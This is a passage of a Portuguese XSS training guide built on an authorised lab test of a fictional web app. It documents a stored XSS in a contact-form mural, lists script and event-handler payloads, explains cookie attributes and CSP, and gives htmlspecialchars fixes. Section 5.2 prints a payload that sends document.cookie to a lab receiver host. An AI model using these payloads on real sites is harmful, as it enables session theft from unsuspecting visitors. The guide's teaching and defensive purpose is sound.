+<p>O fluxo pode atingir quem consultar o conteúdo depois, inclusive em outra sessão ou navegador, se aquela visualização usar a mesma saída insegura. A persistência amplia a exposição potencial, mas não determina sozinha a gravidade. Um campo armazenado e sempre apresentado como texto não configura execução de XSS.</p>
+<h3>4.2 Contact: formulário e mural observados</h3>
+<p>Referência: <a href="http://192.168.10.20/fateccorp/index.php?page=pages/contact.php">Contact — Contato / Ouvidoria</a>. O formulário observado usa POST e <code>action="index.php?page=pages/contact.php"</code>. Não foi inventado um endpoint separado de gravação.</p>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Rótulo observado</th><th scope="col">Nome enviado</th><th scope="col">Tipo e obrigatoriedade no HTML</th></tr></thead><tbody><tr><td>Nome Completo</td><td><code>name</code></td><td>input text, required.</td></tr><tr><td>E-mail corporativo</td><td><code>email</code></td><td>input email, required.</td></tr><tr><td>Empresa / Órgão</td><td><code>company</code></td><td>input text, opcional.</td></tr><tr><td>Mensagem ou Manifestação</td><td><code>message</code></td><td>textarea, required.</td></tr></tbody></table></div>
+<p>Essas restrições do navegador descrevem a interface; não demonstram validação equivalente no servidor. Foi usado <code>tutorial@example.invalid</code>, um endereço fictício, com nome e empresa explicitamente didáticos. O botão observado é “Enviar mensagem para Ouvidoria”.</p>
+<figure><img alt="Formulário vazio de Contact com campos Nome Completo, E-mail corporativo, Empresa ou Órgão e Mensagem ou Manifestação." loading="lazy" src="assets/contact-formulario.png"/><figcaption>Captura real restrita ao formulário vazio. O mural de outras pessoas não foi reproduzido.</figcaption></figure>
+<div class="xss-tutorial-code-label">HTTP · representação dos campos submetidos, não captura integral da rede · somente leitura</div><pre><code>POST /fateccorp/index.php?page=pages/contact.php HTTP/1.1
+Host: 192.168.10.20
+Content-Type: application/x-www-form-urlencoded
+
+name=Demonstra%C3%A7%C3%A3o+did%C3%A1tica+XSS&amp;email=tutorial%40example.invalid&amp;company=Laborat%C3%B3rio+autorizado&amp;message=FATEC_XSS_20261027+%3Cscript%3Econsole.log%28%27Payload+persistente+executado%27%29%3C%2Fscript%3E</code></pre>
+<p>O POST retornou à página Contact e a mensagem apareceu no <strong>Mural de Mensagens Recebidas</strong>, acompanhada do registro no Console. Essa aparição foi a confirmação de envio efetivamente registrada. Nenhum texto específico de banner de sucesso foi preservado na coleta; não se atribui à aplicação uma frase não observada.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;div style="color: #2d3748; line-height: 1.6; font-size: 14px; word-break: break-word;"&gt;
+  FATEC_XSS_20261027 &lt;script&gt;console.log('Payload persistente executado')&lt;/script&gt;
+&lt;/div&gt;
+&lt;!-- Recorte do DOM observado após nova visita, com espaços normalizados. --&gt;</code></pre>
+<p>Depois do envio, os cookies do navegador foram apagados e foi feita uma nova navegação GET para Contact, sem o payload na URL nem no corpo da requisição. A mensagem continuou no mural e o Console voltou a registrar <code>Payload persistente executado</code>. Isso confirma persistência recuperável sem aqueles cookies e execução no contexto de conteúdo de um <code>div</code>. Não foi um teste em outro produto de navegador, nem prova sobre a duração indefinida do armazenamento.</p>
+<aside class="xss-tutorial-note"><strong>Limites da evidência</strong><p>A própria interface afirma usar banco de dados e menciona visualização administrativa. A análise externa confirmou persistência no mural público, mas não inspecionou o banco, o código PHP ou o painel restrito. Não foram confirmadas execução administrativa nem vulnerabilidade individual nos campos name, email e company. O campo testado com código foi message. O controle de reset global do mural não foi acionado; a única mensagem de teste permanece identificada por FATEC_XSS_20261027.</p></aside>
+<h3>4.3 Payloads para demonstração de conteúdo persistido</h3>
+<p>Os seis exemplos seguintes devem ser lidos no fluxo de recuperação do mural. Só o exemplo de Console foi submetido nesta análise. Os outros explicam efeitos possíveis no mesmo tipo de contexto, sem afirmar que foram executados na FatecCorp.</p>
+<article class="xss-tutorial-payload"><h4>Payload 1 — Alerta persistente</h4><p class="xss-tutorial-status">Ilustrativo: este payload não foi submetido em Contact.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Um script chama alert com uma mensagem fixa.</p>
+<p><strong>Contexto e resultado.</strong> Pressupõe que message seja recuperado como HTML ativo no corpo do mural, como ocorreu com o teste de Console. Se permitido, cada visualização vulnerável pode solicitar o alerta Stored XSS.</p>
+<p><strong>Condições e limites.</strong> Codificação contextual, sanitização do HTML permitido e CSP podem impedir a execução. Salvar a string não garante que ela vire código ao exibir. O navegador pode suprimir diálogos.</p>
+<p><strong>Conceito demonstrado.</strong> A execução ocorre na leitura do conteúdo, não necessariamente só no envio.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 2 — Evento onerror</h4><p class="xss-tutorial-status">Ilustrativo: não testado em Contact.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;img src=x onerror="alert('XSS armazenado!')"&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Uma imagem de URL relativa x contém um handler de erro entre aspas duplas.</p>
+<p><strong>Contexto e resultado.</strong> Pressupõe que message seja recuperado como HTML ativo no corpo do mural, como ocorreu com o teste de Console. Se a imagem falhar e o handler for permitido, a visualização solicita XSS armazenado!.</p>
+<p><strong>Condições e limites.</strong> Codificação contextual, sanitização do HTML permitido e CSP podem impedir a execução. Salvar a string não garante que ela vire código ao exibir. Se a URL resolver para imagem válida, esse gatilho não acontece.</p>
+<p><strong>Conceito demonstrado.</strong> A persistência também pode transportar atributos de evento.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 3 — Modificação do título</h4><p class="xss-tutorial-status">Ilustrativo: não testado em Contact.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+document.title='Stored XSS'
+&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Atribui Stored XSS ao título do documento que renderiza a mensagem.</p>
+<p><strong>Contexto e resultado.</strong> Pressupõe que message seja recuperado como HTML ativo no corpo do mural, como ocorreu com o teste de Console. A aba pode passar a mostrar esse título em cada recuperação vulnerável.</p>
+<p><strong>Condições e limites.</strong> Codificação contextual, sanitização do HTML permitido e CSP podem impedir a execução. Salvar a string não garante que ela vire código ao exibir. Código posterior pode sobrescrever o título.</p>
+<p><strong>Conceito demonstrado.</strong> Uma entrada armazenada pode influenciar a interface de quem a lê.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 4 — Console</h4><p class="xss-tutorial-status">Confirmado em Contact: versão equivalente em uma linha, precedida pelo marcador FATEC_XSS_20261027.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+console.log('Payload persistente executado')
+&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Registra uma string fixa no Console, sem ler dados da sessão.</p>
+<p><strong>Contexto e resultado.</strong> Pressupõe que message seja recuperado como HTML ativo no corpo do mural, como ocorreu com o teste de Console. A mensagem reaparece no Console quando o conteúdo armazenado é renderizado.</p>
+<p><strong>Condições e limites.</strong> Codificação contextual, sanitização do HTML permitido e CSP podem impedir a execução. Salvar a string não garante que ela vire código ao exibir. É preciso distinguir o novo log de registros de navegações anteriores.</p>
+<p><strong>Conceito demonstrado.</strong> Persistência e execução foram verificadas separadamente por uma nova visita sem os cookies anteriores.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 5 — SVG</h4><p class="xss-tutorial-status">Ilustrativo: não testado em Contact.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;svg onload=alert('Stored XSS')&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Um elemento SVG aciona alert por um evento load.</p>
+<p><strong>Contexto e resultado.</strong> Pressupõe que message seja recuperado como HTML ativo no corpo do mural, como ocorreu com o teste de Console. Se o evento ocorrer, solicita o alerta Stored XSS.</p>
+<p><strong>Condições e limites.</strong> Codificação contextual, sanitização do HTML permitido e CSP podem impedir a execução. Salvar a string não garante que ela vire código ao exibir. Tratamento de SVG, modo de inserção e eventos variam; onload não é universal em qualquer situação.</p>
+<p><strong>Conceito demonstrado.</strong> HTML persistido deve considerar elementos e atributos executáveis além de script.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 6 — Alteração visual</h4><p class="xss-tutorial-status">Ilustrativo: não testado em Contact.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+document.body.style.backgroundColor='lightyellow'
+&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Muda o estilo inline de fundo do body para lightyellow.</p>
+<p><strong>Contexto e resultado.</strong> Pressupõe que message seja recuperado como HTML ativo no corpo do mural, como ocorreu com o teste de Console. A propriedade pode alterar a aparência do documento durante a visita.</p>
+<p><strong>Condições e limites.</strong> Codificação contextual, sanitização do HTML permitido e CSP podem impedir a execução. Salvar a string não garante que ela vire código ao exibir. Body precisa existir; elementos sobrepostos e regras de estilo podem ocultar a cor.</p>
+<p><strong>Conceito demonstrado.</strong> O conteúdo persistente pode adulterar apresentação, sem que isso comprove comprometimento de sessão.</p>
+</article>
+<h3>4.4 Reflexão e persistência são caminhos diferentes</h3>
+<p>Na News, o navegador recebe o payload da requisição de busca atual. No mural de Contact, ele recebe conteúdo enviado antes por outra requisição. Ambos executam no navegador e dependem do contexto de saída. Corrigir somente o formulário de envio não resolve cópias já armazenadas nem outras telas que recuperem os mesmos dados. A codificação deve ser aplicada em cada ponto de apresentação, inclusive visualizações de maior privilégio que realmente existam e sejam verificadas.</p>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m5"><div class="xss-tutorial-kicker">Módulo 05</div><h2>Cookies, sessões e consequências do XSS</h2>
+<h3>5.1 Cookies: estado entre requisições HTTP</h3>
+<p>HTTP não associa automaticamente duas requisições à mesma pessoa. Cookies são pares nome=valor que o navegador guarda e envia conforme regras de domínio, caminho, segurança e contexto. Um servidor pode emitir <code>Set-Cookie</code> e reconhecer um identificador em requisições posteriores pelo cabeçalho <code>Cookie</code>. O identificador de sessão costuma apontar para estado mantido no servidor; não é, necessariamente, a senha ou todos os dados do usuário.</p>
+<div class="xss-tutorial-code-label">HTTP · esquema ilustrativo · somente leitura</div><pre><code>HTTP/1.1 200 OK
+Set-Cookie: sessao=valor_ficticio; Path=/
+
+# Em uma requisição posterior elegível:
+GET /area HTTP/1.1
+Host: aplicacao.example
+Cookie: sessao=valor_ficticio</code></pre>
+<p>O armazenamento pode durar até o término da sessão do navegador ou até uma expiração definida. Restauração de sessão e políticas de privacidade influenciam esse comportamento. Autenticação é a validação de identidade; um cookie pode carregar o identificador que permite ao servidor reconhecer a sessão autenticada. Nem todo cookie é de autenticação: preferências e outras finalidades também usam esse mecanismo.</p>
+<div class="xss-tutorial-code-label">JavaScript · leitura conceitual, não executada neste tutorial · somente leitura</div><pre><code>document.cookie</code></pre>
+<p>A propriedade devolve uma string com cookies disponíveis ao JavaScript, normalmente separados por ponto e vírgula. A disponibilidade depende de escopo, políticas do navegador e ausência de HttpOnly. Ela pode retornar vazio mesmo quando existem cookies enviados automaticamente. Não revela os atributos HttpOnly, Secure ou SameSite de cada cookie. O <strong>acesso por JavaScript</strong> e o <strong>envio automático em HTTP</strong> são mecanismos distintos.</p>
+<h3>5.2 Exfiltração: análise técnica do mecanismo</h3>
+<p>Exfiltração é a transferência não autorizada de dados para um destino externo ao fluxo previsto. Um XSS pode tentar converter informações acessíveis à página em parâmetros de uma requisição. O exemplo abaixo é apenas referência para análise: não foi executado durante a verificação e nunca deve ser usado para coletar cookies reais.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+new Image().src="http://192.168.10.10:8080/?c="+document.cookie
+&lt;/script&gt;</code></pre>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Trecho</th><th scope="col">Leitura técnica</th></tr></thead><tbody><tr><td><code>&lt;script&gt; … &lt;/script&gt;</code></td><td>Delimita código a ser interpretado pelo navegador se estiver em contexto ativo e for permitido. No tutorial, aparece escapado como texto.</td></tr><tr><td><code>new Image()</code></td><td>Cria um objeto de imagem HTML. Não é necessário anexá-lo visualmente à página para atribuir seu recurso.</td></tr><tr><td><code>.src=</code></td><td>Define a URL do recurso. Essa atribuição pode iniciar uma busca HTTP pela imagem. Uma imagem válida não é necessária para o receptor registrar a tentativa.</td></tr><tr><td><code>http://192.168.10.10</code></td><td>Endereço privado indicado para um receptor local de laboratório. Não é a FatecCorp, que está em 192.168.10.20. Ser privado não elimina o risco de exposição a outros participantes da rede.</td></tr><tr><td><code>:8080</code></td><td>Porta TCP do serviço receptor pretendido. Sem serviço acessível, não há recebimento comprovado.</td></tr><tr><td><code>/?c=</code></td><td>Caminho raiz / e parâmetro de consulta chamado c. O nome c é uma escolha do exemplo, não um campo obrigatório de cookies.</td></tr><tr><td><code>+</code></td><td>Concatena a URL inicial com o resultado da expressão seguinte.</td></tr><tr><td><code>document.cookie</code></td><td>Lê apenas cookies disponíveis ao JavaScript naquele documento. Esses caracteres passam a compor o valor de consulta da URL.</td></tr></tbody></table></div>
+<p>Se a requisição for permitida e chegar ao receptor, a URL pode aparecer nos registros de acesso. Isso pode expor informação mesmo que o navegador não consiga ler a resposta do receptor. A política de mesma origem e o CORS não são uma barreira geral contra o envio de uma requisição de imagem: restringir a leitura de respostas é diferente de impedir tráfego de saída.</p>
+<p>O exemplo original concatena o valor sem codificá-lo. Caracteres como <code>&amp;</code> e <code>#</code> podem alterar a consulta ou produzir fragmentos que não chegam ao servidor. Isso é uma limitação de fidelidade do exemplo, não uma defesa confiável. Um valor vazio também não comprova proteção completa contra XSS.</p>
+<div aria-label="Fluxo conceitual" class="xss-tutorial-flow"><span>FatecCorp: resposta vulnerável</span><b aria-hidden="true">→</b><span>Navegador: código lê um valor</span><b aria-hidden="true">→</b><span>URL de imagem com parâmetro</span><b aria-hidden="true">→</b><span>Receptor local: registro da URL</span></div>
+<p>O navegador é quem inicia a requisição para o receptor; o servidor da FatecCorp não precisa encaminhar diretamente esses dados. Quando o valor é incorporado à URL, ele deixa de ser apenas um cookie enviado pelas regras normais e torna-se texto em um endereço de destino escolhido pelo código.</p>
+<h3>5.3 Simulação com dados fictícios</h3>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+new Image().src="http://192.168.10.10:8080/?c="+
+encodeURIComponent("COOKIE_DE_TESTE=valor_ficticio")
+&lt;/script&gt;</code></pre>
+<p>Aqui não existe leitura de <code>document.cookie</code>. A string fixa contém somente um nome e um valor de demonstração. <code>encodeURIComponent</code> codifica caracteres de um componente da URL, preservando-os como valor do parâmetro; não criptografa nem torna dados secretos. O sinal de igual do valor fictício é representado por <code>%3D</code>.</p>
+<div class="xss-tutorial-code-label">HTTP · aparência conceitual, não tráfego capturado · somente leitura</div><pre><code>GET /?c=COOKIE_DE_TESTE%3Dvalor_ficticio HTTP/1.1
+Host: 192.168.10.10:8080</code></pre>
+<div class="xss-tutorial-code-label">Log · formato ilustrativo; o IP real seria o do cliente ou intermediário · somente leitura</div><pre><code>192.168.10.20 - - [DATA/HORA] "GET /?c=COOKIE_DE_TESTE%3Dvalor_ficticio HTTP/1.1" 404 -</code></pre>
+<p>Um registro pode conter método, caminho, consulta, data e status. Até um status 404 pode indicar que a requisição chegou, embora nenhuma imagem tenha sido encontrada. O endereço do cliente não é necessariamente o servidor da aplicação; o IP na linha acima é apenas um exemplo. O receptor só observará algo se houver conectividade, serviço disponível e permissão das políticas do navegador. Nenhum serviço receptor foi iniciado ou contatado nesta análise; não há log real de exfiltração.</p>
+<aside class="xss-tutorial-note"><strong>Simulação não é coleta</strong><p>O valor COOKIE_DE_TESTE=valor_ficticio serve para explicar transporte de dados. Os testes na FatecCorp usaram apenas alertas, Console e alterações locais de apresentação. As requisições ao endereço receptor 192.168.10.10 foram bloqueadas no navegador de análise, inclusive para evitar ativar conteúdo preexistente do mural. Não houve coleta de cookies de autenticação.</p></aside>
+<h3>5.4 HttpOnly: proteger a leitura do identificador</h3>
+<div class="xss-tutorial-code-label">HTTP · dois cenários alternativos · somente leitura</div><pre><code>Set-Cookie: sessao=valor_ficticio; Path=/
+
+Set-Cookie: sessao=valor_ficticio; Path=/; HttpOnly</code></pre>
+<p>No primeiro cenário, o cookie pode estar disponível a <code>document.cookie</code>, se as demais condições de escopo e política permitirem. No segundo, <strong>HttpOnly</strong> o exclui das APIs de cookies acessíveis a JavaScript. O servidor define esse atributo pelo cabeçalho; JavaScript não consegue criar um cookie HttpOnly por atribuição a document.cookie.</p>
+<p>Mesmo com HttpOnly, o navegador pode enviar o cookie automaticamente em requisições elegíveis. Portanto, um script injetado pode executar ações com a sessão existente, ler informações apresentadas na página ou adulterar a interface sem obter o identificador diretamente. HttpOnly reduz uma via de exposição, mas não neutraliza o XSS.</p>
+<h3>5.5 Secure e SameSite: controles com funções diferentes</h3>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Atributo</th><th scope="col">O que protege</th><th scope="col">O que não resolve</th></tr></thead><tbody><tr><td><code>HttpOnly</code></td><td>Restringe leitura do cookie por JavaScript.</td><td>Não impede ações feitas pelo navegador com a sessão.</td></tr><tr><td><code>Secure</code></td><td>Restringe envio do cookie a conexões consideradas seguras, normalmente HTTPS; navegadores têm tratamento especial para localhost.</td><td>Não esconde, por si, o valor de JavaScript nem corrige HTML inseguro. Um IP privado HTTP não equivale a localhost.</td></tr><tr><td><code>SameSite</code></td><td>Controla envio em determinados contextos entre sites: Strict, Lax ou None. None exige Secure em navegadores modernos.</td><td>Não é uma barreira geral a scripts que já executam na própria aplicação.</td></tr></tbody></table></div>
+<p>“Mesmo site” e “mesma origem” não são sinônimos: origem considera esquema, host e porta; a noção de site agrupa contextos segundo regras do navegador, incluindo o esquema. Lax e Strict têm políticas diferentes para navegações e requisições entre sites. Essas escolhas precisam acompanhar o fluxo de autenticação legítimo. Se um script já leu um valor e o colocou na consulta de uma imagem, SameSite não transforma aquele parâmetro em cookie protegido.</p>
+<div class="xss-tutorial-code-label">HTTP · exemplo para aplicação servida por HTTPS · somente leitura</div><pre><code>Set-Cookie: sessao=valor_ficticio; Path=/; HttpOnly; Secure; SameSite=Lax</code></pre>
+<p>Esse cabeçalho é uma composição ilustrativa, não uma configuração verificada da FatecCorp. A aplicação fornecida usa HTTP em IP privado; migrar para HTTPS é necessário para empregar adequadamente cookies Secure nesse cenário. Os conceitos de armazenamento e atributos podem ser consultados em <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies">HTTP Cookies, MDN</a>.</p>
+<h3>5.6 CSP, conteúdo misto e outras restrições</h3>
+<p>A <strong>Content Security Policy (CSP)</strong> pode limitar as origens de scripts e o uso de código inline. Uma política sem autorização para scripts inline pode bloquear tanto elementos script injetados quanto handlers de evento. A diretiva <code>img-src</code> pode impedir que uma imagem seja requisitada a um destino não permitido, mesmo quando algum JavaScript já conseguiu executar.</p>
+<p>Em uma página HTTPS, carregar uma imagem por HTTP envolve conteúdo misto. Conforme o recurso e o navegador, há bloqueio ou atualização para HTTPS; imagens com URL HTTP em endereço IP são particularmente sujeitas a bloqueio em vez de atualização automática. Não se deve presumir que o receptor HTTP funcionará. Políticas de acesso à rede local, bloqueadores, sandbox de frames, configurações de privacidade e conectividade também interferem.</p>
+<p>Na FatecCorp, as execuções registradas mostram que os exemplos específicos não foram impedidos naquela navegação. Isso não equivale a uma auditoria completa de cabeçalhos, versões, extensões ou todas as políticas possíveis. Uma falha de conexão com o receptor também não provaria que a falha de XSS foi corrigida.</p>
+<h3>5.7 Consequências além de alertas</h3>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Impacto</th><th scope="col">Condição técnica relevante</th></tr></thead><tbody><tr><td>Exposição de dados e confidencialidade</td><td>Código pode ler conteúdo acessível à página e tentar transmiti-lo, sujeito a políticas de execução e rede.</td></tr><tr><td>Manipulação da interface</td><td>Pode alterar textos, links e campos, afetando decisões do usuário e a integridade do que é exibido.</td></tr><tr><td>Ações na sessão</td><td>Requisições elegíveis podem carregar cookies automaticamente. Autorizações do servidor continuam delimitando as ações possíveis.</td></tr><tr><td>Possível comprometimento de sessão</td><td>Depende da exposição de credenciais ou identificadores utilizáveis, da validade da sessão e de controles adicionais. Não é consequência automática.</td></tr><tr><td>Maior alcance do conteúdo persistido</td><td>Depende de quem visualiza a saída vulnerável, quando isso acontece e com quais privilégios.</td></tr></tbody></table></div>
+<p>As demonstrações locais comprovam capacidade de execução ou alteração visual. Não comprovaram acesso privilegiado, reutilização de sessão, exfiltração real ou comprometimento de contas. Essa distinção permite avaliar o risco sem substituir evidência por suposição.</p>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m6"><div class="xss-tutorial-kicker">Módulo 06</div><h2>Como identificar vulnerabilidades XSS</h2>
+<h3>6.1 Uma metodologia baseada em evidências</h3>
+<p>Em sistemas autorizados, a análise começa pelo caminho dos dados, não por uma coleção de strings. Um marcador alfanumérico único permite localizar reflexões sem introduzir comportamento ativo. Depois, a estrutura ao redor do marcador revela quais delimitadores e regras do parser importam. Apenas então um efeito inofensivo pode comprovar execução.</p>
+<ol><li><strong>Mapear entradas reais.</strong> Ler formulários, nomes dos campos, action, method, campos ocultos e parâmetros existentes. News expôs busca e page; Contact expôs name, email, company e message.</li><li><strong>Entender o transporte.</strong> Em GET, examinar a consulta da URL. Em POST, conferir o corpo e o Content-Type. URL encoding é transporte, não escape HTML.</li><li><strong>Localizar a saída.</strong> Procurar o marcador na resposta recebida e verificar todas as ocorrências, não só a primeira. Na News, ele apareceu no value e em dois elementos strong.</li><li><strong>Classificar cada contexto.</strong> Texto entre tags, atributo entre aspas, URL e conteúdo de script exigem tratamentos diferentes. Anotar delimitadores e elementos adjacentes.</li><li><strong>Verificar recuperação posterior.</strong> Para conteúdo armazenado, abrir a visualização sem reenviar a entrada. Em Contact, uma nova visita após apagar cookies recuperou o marcador.</li><li><strong>Confirmar interpretação.</strong> Registrar um efeito controlado: chamada de função, mensagem nova no Console ou alteração de propriedade. Relacionar o efeito à entrada e à navegação corretas.</li><li><strong>Documentar limites.</strong> Distinguir observação do navegador, indicação da interface e implementação não inspecionada. Corrigir a saída e repetir a mesma verificação para avaliar a correção.</li></ol>
+<h3>6.2 Ferramentas do navegador</h3>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Ferramenta</th><th scope="col">Pergunta que responde</th><th scope="col">Relação com a FatecCorp</th></tr></thead><tbody><tr><td>Network</td><td>Qual método, URL, corpo, resposta e política foram recebidos?</td><td>O envio da busca é GET; Contact é POST. Examinar Payload/Form Data e Response, sem copiar cookies ou tokens para relatórios.</td></tr><tr><td>View Source / código-fonte</td><td>O que veio no documento HTML antes das alterações feitas por scripts?</td><td>Localiza value e conteúdo de strong. Em respostas POST, preferir também Response em Network para evitar confundir uma nova navegação com a resposta original.</td></tr><tr><td>Elements</td><td>Como o parser construiu a árvore e quais atributos estão ativos agora?</td><td>Confirma onfocus e autofocus criados no input busca; mostra o script recuperado no div do mural.</td></tr><tr><td>Console</td><td>Houve efeito de execução, erro de sintaxe ou bloqueio por política?</td><td>Mostrou XSS executado e Payload persistente executado. Filtrar mensagens e distinguir registros anteriores é essencial.</td></tr></tbody></table></div>
+<p>Elements mostra o estado atual, que pode ter sido corrigido pelo parser ou modificado por código; não é uma cópia byte a byte da resposta. Um efeito causado por um comando digitado manualmente no Console também não comprova que o servidor refletiu ou armazenou um payload. A origem da execução deve ser a entrada examinada.</p>
+<h3>6.3 Recebido, refletido, armazenado e executado</h3>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Estado</th><th scope="col">Evidência suficiente para esse estado</th><th scope="col">O que ainda não prova</th></tr></thead><tbody><tr><td>Recebido</td><td>A entrada consta da requisição e há evidência de processamento correspondente.</td><td>Que ela será exibida ou interpretada como código.</td></tr><tr><td>Refletido</td><td>A entrada reaparece na resposta da requisição.</td><td>Que a saída seja executável; pode estar corretamente codificada.</td></tr><tr><td>Armazenado</td><td>O valor é recuperado depois, sem ser reenviado na requisição atual.</td><td>Qual tecnologia o guarda, nem se há execução.</td></tr><tr><td>Executado</td><td>Um efeito atribuível ao código injetado foi observado no navegador.</td><td>Qualquer consequência adicional, como acesso administrativo ou coleta de sessões.</td></tr></tbody></table></div>
+<aside class="xss-tutorial-note"><strong>Aparência de código não basta</strong><p>Ver &lt;script&gt; no texto de uma página não confirma XSS. O texto pode estar escapado, dentro de um atributo não rompido ou em uma região que não executa. Inversamente, um handler de evento pode executar sem um elemento script. Contexto, evento e política precisam ser analisados juntos.</p></aside>
+<h3>6.4 Registro consolidado da inspeção</h3>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Ponto analisado</th><th scope="col">Resultado e alcance</th></tr></thead><tbody><tr><td>News: formulário</td><td>GET index.php, page=pages/news.php, busca. Confirmado por HTML e navegador.</td></tr><tr><td>News: reflexão</td><td>Marcador em value e dois strong; script e eventos foram interpretados em contextos ativos.</td></tr><tr><td>News: payloads 1–9</td><td>Chamadas instrumentadas de alert, Console, título e estilo confirmados conforme cada exemplo.</td></tr><tr><td>News: atributo</td><td>Quebra de value, criação de onfocus/autofocus e chamada correspondente confirmadas.</td></tr><tr><td>Contact: envio</td><td>POST na própria rota; mensagem fictícia apareceu no mural. Banner de confirmação específico não registrado.</td></tr><tr><td>Contact: persistência</td><td>message reapareceu e o Console executou em nova navegação após apagar cookies.</td></tr><tr><td>Contact: limites</td><td>Outros cinco payloads armazenados, painel restrito, banco e demais campos não foram testados quanto a execução.</td></tr><tr><td>Cookies e receptor</td><td>Sem coleta real, sem envio de document.cookie e sem teste do receptor. Exemplos desta apostila são conceituais.</td></tr></tbody></table></div>
+<p>A inspeção foi feita com Chromium automatizado por Selenium. A tentativa inicial de usar Playwright não funcionou por ausência de seu driver; isso não impediu a análise no navegador disponível. As capturas incluídas são reais, recortadas para mostrar apenas conteúdo didático. Não foram utilizados o reset global do mural nem credenciais administrativas.</p>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m7"><div class="xss-tutorial-kicker">Módulo 07</div><h2>Prevenção e correção de XSS</h2>
+<h3>7.1 Codificação de saída: preservar o significado de dado</h3>
+<p>Codificar a saída significa transformar caracteres que têm função sintática naquele contexto em representações de dados. Para texto HTML e valores de atributos comuns delimitados por aspas, PHP oferece <code>htmlspecialchars</code>. O tratamento deve ocorrer no momento da apresentação; validar a entrada continua útil para regras de negócio, mas não substitui a proteção da saída.</p>
+<div class="xss-tutorial-code-label">PHP · somente leitura</div><pre><code>htmlspecialchars(
+    $valor,
+    ENT_QUOTES | ENT_SUBSTITUTE,
+    'UTF-8'
+);</code></pre>
+<p><code>ENT_QUOTES</code> inclui aspas simples e duplas no tratamento. <code>ENT_SUBSTITUTE</code> substitui sequências inválidas de caracteres, evitando falhas de representação; não é uma função de validação de negócio. <code>UTF-8</code> declara a codificação esperada, que deve estar alinhada à resposta. A função devolve uma string: é necessário usar esse retorno na saída.</p>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Caractere de entrada</th><th scope="col">Representação HTML típica</th><th scope="col">Resultado visual</th></tr></thead><tbody><tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td><td>Um &amp; literal.</td></tr><tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td><td>Um &lt; literal, não início de tag.</td></tr><tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td><td>Um &gt; literal.</td></tr><tr><td><code>"</code></td><td><code>&amp;quot;</code></td><td>Uma aspa dupla dentro do dado.</td></tr><tr><td><code>'</code></td><td><code>&amp;#039;</code></td><td>Uma aspa simples; a entidade concreta depende das opções de tipo de documento.</td></tr></tbody></table></div>
+<p>Codificar duas vezes pode produzir texto como <code>&amp;lt;</code> na interface. Por isso a aplicação deve ter uma política consistente de armazenamento e apresentação: em geral, preservar dados como dados e codificar para cada destino. Não remover a proteção para “consertar” entidades exibidas sem entender onde ocorreu a dupla codificação. Referência: <a href="https://www.php.net/manual/en/function.htmlspecialchars.php">manual oficial de htmlspecialchars</a>.</p>
+<h3>7.2 Código vulnerável e versão corrigida</h3>
+<div class="xss-tutorial-code-label">PHP · vulnerável em saída HTML · somente leitura</div><pre><code>&lt;?php
+echo $_GET['nome'];
+?&gt;</code></pre>
+<p>A versão vulnerável escreve diretamente um parâmetro controlável na resposta. Se estiver em texto HTML, a entrada pode criar marcação; se o parâmetro faltar, também há um problema de robustez. O nome <code>nome</code> é ilustrativo e não corresponde a um parâmetro observado na News.</p>
+<div class="xss-tutorial-code-label">PHP · corrigido para saída em texto HTML · somente leitura</div><pre><code>&lt;?php
+echo htmlspecialchars(
+    $_GET['nome'] ?? '',
+    ENT_QUOTES | ENT_SUBSTITUTE,
+    'UTF-8'
+);
+?&gt;</code></pre>
+<p>O operador <code>??</code> fornece uma string vazia quando o parâmetro está ausente ou é nulo. A função transforma os caracteres relevantes antes do echo; a entrada passa a ser mostrada como texto. Este exemplo pressupõe valor escalar do tipo string: uma aplicação robusta também deve rejeitar formatos inesperados, como um parâmetro recebido como array. A correção não é genérica para inserir conteúdo em JavaScript ou em atributos de evento.</p>
